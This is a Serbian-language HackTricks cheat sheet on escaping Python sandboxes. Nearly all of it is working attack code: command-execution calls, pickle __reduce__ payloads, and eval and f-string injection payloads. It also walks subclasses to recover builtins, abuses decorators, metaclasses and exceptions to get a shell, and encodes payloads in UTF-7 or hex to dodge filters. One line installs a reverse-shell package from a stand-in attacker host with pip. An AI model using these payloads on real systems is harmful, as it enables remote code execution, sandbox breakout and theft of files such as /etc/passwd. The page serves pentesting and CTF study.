# Zaobilaženje Python sandboxova

{{#include ../../../banners/hacktricks-training.md}}

Ovo su neki trikovi za zaobilaženje zaštita Python sandboxa i izvršavanje proizvoljnih komandi.<sup>[[1]](#references)[[2]](#references)</sup>

{{#ref}}
js2py-sandbox-escape-cve-2024-28397.md
{{#endref}}


## Biblioteke za izvršavanje komandi

Prvo treba da saznate da li možete direktno da izvršite kod pomoću neke već uvezene biblioteke ili možete da uvezete neku od ovih biblioteka:

```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```

Zapamtite da funkcije _**open**_ i _**read**_ mogu biti korisne za **čitanje datoteka** unutar Python sandboxa i za pisanje **koda** koji možete **izvršiti** da biste **zaobišli** sandbox.

> [!CAUTION] > Funkcija **Python2 input()** omogućava izvršavanje Python koda pre nego što se program sruši.

Python prvo pokušava da **učita biblioteke iz trenutnog direktorijuma** (sledeća komanda će prikazati odakle Python učitava module): `python3 -c 'import sys; print(sys.path)'`

![Zaobilaženje Python sandboxa - biblioteke za izvršavanje komandi: Python prvo pokušava da učita biblioteke iz trenutnog direktorijuma (sledeća komanda će prikazati odakle Python učitava module...](<../../../images/image (559).png>)

## Zaobilaženje pickle sandboxa pomoću podrazumevano instaliranih Python paketa

### Podrazumevani paketi

Ovde možete pronaći **spisak unapred instaliranih** paketa: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Imajte na umu da pomoću pickle-a možete naterati Python okruženje da **uveze proizvoljne biblioteke** instalirane na sistemu.\
Na primer, sledeći pickle će prilikom učitavanja uvesti pip biblioteku kako bi je koristio:

```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
    def __reduce__(self):
        return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```

Za više informacija o tome kako pickle funkcioniše pogledajte: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/).<sup>[[16]](#references)</sup>

### Pip paket

Trik koji je podelio **@isHaacK**

Ako imate pristup `pip` ili `pip.main()`, možete da instalirate proizvoljan paket i dobijete reverse shell pozivom:

```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```

Možete preuzeti paket za kreiranje reverse shell-a ovde. Imajte na umu da pre korišćenja treba da ga **dekompresujete, izmenite `setup.py` i unesete svoju IP adresu za reverse shell**:

{{#file}}
Reverse.tar (1).gz
{{#endfile}}

> [!TIP]
> Ovaj paket se zove `Reverse`. Međutim, posebno je napravljen tako da, kada izađete iz reverse shell-a, ostatak instalacije ne uspe, pa **na serveru neće ostati instaliran nijedan dodatni Python paket** kada završite.

## Test za evaluaciju Python izraza

Kada se čini da se ulaz obrađuje kao Python izraz, bezopasan poziv funkcije `str()` može pomoći da potvrdite da se rezultat izvršava, a ne samo prikazuje doslovno. Prilagodite navodnike u skladu sa kontekstom injekcije:<sup>[[19]](#references)</sup>

```python
"+str(True)+"  # If True is printed, the expression was evaluated.
```

Ne tretirajte ovu proveru kao dokaz da mogu da se izvršavaju proizvoljne naredbe ili komande operativnog sistema; sink možda podržava samo ograničeni jezik izraza.

Povezane ulazne tačke na vebu: [server-side template injection](../../../pentesting-web/ssti-server-side-template-injection/README.md) i [deserialization](../../../pentesting-web/deserialization/README.md).

## Eval-ing Python kod

> [!WARNING]
> Imajte u vidu da exec podržava višelinijske stringove i „;“, ali eval ne (proverite walrus operator)

Ako su određeni znakovi zabranjeni, možete koristiti **hex/octal/B64** reprezentaciju da biste **zaobišli** ograničenje:

```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```

### Mesta za ponovnu evaluaciju f-stringova

Druga, ali veoma česta greška je **ubacivanje podataka pod kontrolom napadača u string, a zatim evaluacija tog stringa kao f-stringa**. Ovo **nije** Jinja/SSTI; sam Python interpreter izvršava sve što se nađe unutar `{...}` tokom drugog koraka evaluacije:<sup>[[10]](#references)</sup>

```python
def template(first, last, gender):
    text = f"Patient {first} {last} ({gender})"
    return eval(f"f'''{text}'''")
```

```python
s = "2+3"
eval(f"f'''{s}'''")
# '2+3'

s = "{2+3}"
eval(f"f'''{s}'''")
# '5'
```

Dakle, ako su vitičaste zagrade, navodnici, tačke, donje crte i oble zagrade dozvoljeni, payload kao što je sledeći obično omogućava izvršavanje komandi:

```python
{__import__("os").popen("id").read()}
```

Ako se razmaci ili shell metaznakovi filtriraju, umotajte komandu u Base64 i dekodirajte je unutar izraza:

```python
{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
```

Korisni obrasci za traženje:

- `eval(f"f'''{user_input}'''")`
- `eval(f'f"{user_input}"')`
- Kod koji pravi predložak s korisničkim podacima, a zatim poziva `eval`, `exec` ili `compile` nad ponovo izgrađenim stringom
- XML/JSON rukovaoci koji pomoću regexa proveravaju znakove, ali i dalje dozvoljavaju `{}` i navodnike

Ako je sink iza Flask endpointa koji parsira sirovi XML/bytes iz `request.data`, imajte na umu da `curl -d` podrazumevano koristi `application/x-www-form-urlencoded`, zbog čega `request.data` može ostati prazan. Umesto toga koristite **ne-form** tip sadržaja:

```bash
curl http://127.0.0.1:54321/addPatient \
  -X POST \
  -H 'Content-Type: application/xml' \
  -d '<patient><firstname>a</firstname><lastname>b</lastname><sender_app>app</sender_app><timestamp>1</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
```

### Druge biblioteke koje omogućavaju evaluaciju Python koda

```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```

Takođe pogledajte bekstvo iz sandboxovanog evaluatora u generatorima PDF-ova iz stvarnog sveta:

- Evaluacija izraza sa trostrukim uglastim zagradama [[[...]]] u ReportLab/xhtml2pdf → RCE (CVE-2023-33733). Zloupotrebljava rl_safe_eval da bi pristupio function.__globals__ i os.system iz evaluiranih atributa (na primer, boje fonta) i vraća validnu vrednost kako bi renderovanje ostalo stabilno.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

{{#ref}}
reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

## Operatorи i kratki trikovi

```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```

## Strukturno uparivanje obrazaca kao implicitno čitanje atributa

U Pythonu 3.10+, obrazac klase najpre proverava `isinstance(subject, Class)`. Kod pozicionog obrasca, Python mapira pozicije pomoću `Class.__match_args__` i interno čita te atribute sa objekta subject.<sup>[[18]](#references)</sup>

AST filter koji odbacuje samo čitanja `ast.Attribute` ili pozive `getattr()` može da ne prepozna ovu putanju `ast.MatchClass`. Za to je potrebno da `match/case` bude dozvoljen i da se koristi odgovarajuća klasa čiji `__match_args__` može da se menja; ovo nije bypass ako je objekat koji se proverava umotan u proxy koji sprovodi isto ograničenje.<sup>[[17]](#references)</sup>

Na primer, `namedtuple()` može da obezbedi promenljivu klasu čak i kada izloženi `builtins` ne sadrže `__build_class__`. Ako se filtriraju doslovni dunder stringovi, sastavite ime tokom izvršavanja. Obrazac ispod preuzima `__reduce_ex__` bez čitanja pomoću atributne sintakse koju je uneo korisnik; u opisanom sandboxu, protokol 4 je kao prvi element recepta za rekonstrukciju vratio pravu Python funkciju `copyreg.__newobj__`.<sup>[[17]](#references)</sup>

```python
from collections import namedtuple

def dunder(name):
    return chr(95)*2 + name + chr(95)*2

Record = namedtuple("Record", "value")
Record.__match_args__ = (dunder("reduce_ex"),)
match Record(1):
    case Record(reduce_method):
        function = reduce_method(4)[0]
print(function)  # <function __newobj__ ...>
```

Drugi obrazac klase mora da odgovara toj stvarnoj funkciji pre nego što može da pročita `__globals__`. Prijavljena zamena `_safe_type()` vratila je **promenljivi proxy tipa funkcije** za `type(lambda: None)`, koji je ipak prošao proveru instance funkcije. Samo uz takvo nebezbedno ponašanje proxy-ja, sledeći nastavak može da otkrije originalni rečnik `__builtins__` i njegov unos `__import__`; stvarni nepromenljivi tip funkcije ne može se menjati na ovaj način. Pogledajte [oporavak builtins](#builtins) za naredne primitive za import i izvršavanje komandi.<sup>[[17]](#references)</sup>

```python
FunctionProxy = type(lambda: None)  # vulnerable sandbox's replacement type()
FunctionProxy.__match_args__ = (dunder("globals"),)
match function:
    case FunctionProxy(module_globals):
        real_builtins = module_globals[dunder("builtins")]
        importer = real_builtins[dunder("import")]
```

## Zaobilaženje zaštita pomoću enkodiranja (UTF-7)

U [**ovom prikazu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 se koristi za učitavanje i izvršavanje proizvoljnog Python koda unutar prividnog sandbox-a:<sup>[[11]](#references)</sup>

```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
""".lstrip()
```

Moguće ga je zaobići i pomoću drugih kodiranja, npr. `raw_unicode_escape` i `unicode_escape`.

## Izvršavanje u Pythonu bez poziva

Ako se nalazite u Python sandboxu koji **ne dozvoljava pozive**, i dalje postoje načini da **izvršite proizvoljne funkcije, kod** i **komande**.

### RCE pomoću [decorators](https://docs.python.org/3/glossary.html#term-decorator)

```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
    pass

# The previous code is equivalent to:
class X:
    pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```

### RCE kreiranjem objekata i preopterećenjem

Ako možete **deklarisati klasu** i **napraviti objekat** te klase, možete **napisati/prepisati različite metode** koje se mogu **aktivirati** **bez potrebe da ih direktno pozivate**.

#### RCE sa prilagođenim klasama

Možete izmeniti neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) tako da **izvršavaju proizvoljan kod** kada se **aktiviraju**, bez direktnog pozivanja.

```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
    def __init__(self):
        self += "print('Hello from __init__ + __iadd__')"
    __iadd__ = exec #Triggered when object is created
    def __del__(self):
        self -= "print('Hello from __del__ + __isub__')"
    __isub__ = exec #Triggered when object is created
    __getitem__ = exec #Trigerred with obj[<argument>]
    __add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```

#### Kreiranje objekata pomoću [metaklasa](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Ključna stvar koju nam metaklase omogućavaju jeste da **napravimo instancu klase bez direktnog pozivanja konstruktora**, tako što ćemo kreirati novu klasu kojoj je ciljna klasa metaklasa.<sup>[[15]](#references)</sup>

```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
    __getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
    pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```

#### Kreiranje objekata pomoću izuzetaka

Kada se **izuzetak pokrene**, objekat klase **Exception** se **kreira** bez potrebe da direktno pozovete konstruktor (trik koji je otkrio [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):

```python
class RCE(Exception):
    def __init__(self):
        self += 'import os; os.system("sh")'
    __iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
  __add__ = exec

try:
  raise Klecko
except Klecko as k:
  k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```

### Još RCE

```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
    def __init__(self, a, b, c):
        self += "os.system('sh')"
    __iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```

### Čitanje datoteke pomoću builtins help & license

```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

## Ugrađene funkcije

- [**Ugrađene funkcije u python2**](https://docs.python.org/2/library/functions.html)
- [**Ugrađene funkcije u python3**](https://docs.python.org/3/library/functions.html)

Ako možete da pristupite objektu **`__builtins__`**, možete da uvezete biblioteke (imajte na umu da ovde možete da koristite i neki drugi prikaz stringa, kao što je prikazano u prethodnom odeljku):

```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```

### Bez ugrađenih funkcija

Kada nemate `__builtins__`, nećete moći ništa da uvezete, niti čak da čitate ili upisujete datoteke, jer **sve globalne funkcije** (kao što su `open`, `import`, `print`...) **nisu učitane**.\
Međutim, **Python podrazumevano učitava mnogo modula u memoriju**. Ovi moduli mogu delovati bezazleno, ali neki od njih **takođe uvoze opasne** funkcionalnosti kojima se može pristupiti radi postizanja čak i **arbitrary code execution**.<sup>[[4]](#references)[[5]](#references)</sup>

U sledećim primerima možete videti kako da **zloupotrebite** neke od ovih „**bezazlenih**“ učitanih modula da biste **pristupili** **opasnim** **funkcionalnostima** u njima.

**Python2**

```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```

#### Python3

```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```

[**Ispod se nalazi veća funkcija**](#recursive-search-of-builtins-globals) za pronalaženje desetina/**stotina** **mesta** na kojima možete pronaći **builtins**.

#### Python2 i Python3

```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```

### Payload-i za builtins

```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```

## Globalne i lokalne promenljive

Provera **`globals`** i **`locals`** dobar je način da saznate čemu možete pristupiti.

```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```

[**Ispod je veća funkcija**](#recursive-search-of-builtins-globals) za pronalaženje desetina/**stotina** **mesta** na kojima možete pronaći **globals**.

## Otkrivanje proizvoljnog izvršavanja

Ovde želim da objasnim kako lako otkriti **još opasnih učitanih funkcionalnosti** i predložiti pouzdanije exploit-e.

#### Pristup podklasama pomoću bypass-a

Jedan od najosetljivijih delova ove tehnike jeste mogućnost **pristupa osnovnim podklasama**. U prethodnim primerima to je urađeno pomoću `''.__class__.__base__.__subclasses__()`, ali postoje **i drugi mogući načini**:

```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```

### Pronalaženje opasnih biblioteka

Na primer, znajući da je pomoću biblioteke **`sys`** moguće **importovati proizvoljne biblioteke**, možete pretražiti sve **učitane module koji su u sebi importovali sys**:

```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```

Ima ih mnogo, a **potreban nam je samo jedan** za izvršavanje komandi:

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```

